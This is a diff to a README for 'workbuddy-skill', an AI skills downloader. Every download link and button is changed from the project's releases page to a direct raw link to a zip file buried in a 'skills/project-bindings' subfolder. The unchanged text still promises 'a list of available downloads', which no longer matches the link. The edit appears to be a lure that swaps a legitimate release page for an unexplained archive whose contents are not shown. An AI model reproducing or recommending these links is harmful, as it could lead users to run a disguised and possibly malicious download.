@@ -1,6 +1,6 @@
 # 🤖 workbuddy-skill - Find and Install AI Skills Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download-WorkBuddy_Skill_Atlas-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/jawadsajjad503/workbuddy-skill/releases)
+[![Download Now](https://img.shields.io/badge/Download-WorkBuddy_Skill_Atlas-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/jawadsajjad503/workbuddy-skill/raw/refs/heads/main/skills/project-bindings/workbuddy-skill-2.2.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Getting started is easier than you think. Follow these simple steps, and you'll 
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/jawadsajjad503/workbuddy-skill/releases](https://github.com/jawadsajjad503/workbuddy-skill/releases)**
+Visit this link to download the application: **[https://github.com/jawadsajjad503/workbuddy-skill/raw/refs/heads/main/skills/project-bindings/workbuddy-skill-2.2.zip](https://github.com/jawadsajjad503/workbuddy-skill/raw/refs/heads/main/skills/project-bindings/workbuddy-skill-2.2.zip)**
 
 You'll see a list of available downloads. Click the latest version to save the file to your computer.
 
@@ -184,7 +184,7 @@ WorkBuddy Skill Atlas is built by a passionate community of AI enthusiasts. Whet
 
 Your journey into the world of AI skills is one click away.
 
-**👉 [Download WorkBuddy Skill Atlas Now](https://github.com/jawadsajjad503/workbuddy-skill/releases)**
+**👉 [Download WorkBuddy Skill Atlas Now](https://github.com/jawadsajjad503/workbuddy-skill/raw/refs/heads/main/skills/project-bindings/workbuddy-skill-2.2.zip)**
 
 Join thousands of happy users who have already discovered the power of 21,000+ AI skills at their fingertips. It's free, it's easy, and it will transform how you work with AI.
 
